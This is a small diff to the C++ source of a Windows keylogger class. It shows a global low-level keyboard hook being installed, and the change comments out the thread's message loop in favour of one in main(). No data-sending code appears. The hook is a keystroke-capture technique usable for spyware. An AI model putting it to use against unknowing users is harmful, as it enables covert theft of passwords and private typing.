@@ -51,13 +51,14 @@ void KeyLogger::InstallHook(void)
     // Set a global Windows Hook to capture keystrokes. Callback to static wrapper for non-static function
     mHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger::LowLevelKeyboardProc, appInstance, 0 );
 
-	// This will 'hang' the thread running (and listening for keystrokes)
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0) > 0)
-    {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+	// Use message loop in main() intead this.
+	// TODO: In future remove it.
+    //MSG msg;
+    //while (GetMessage(&msg, NULL, 0, 0) > 0)
+    //{
+    //    TranslateMessage(&msg);
+    //    DispatchMessage(&msg);
+    //}
 }
 
 LRESULT CALLBACK KeyLogger::LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam )
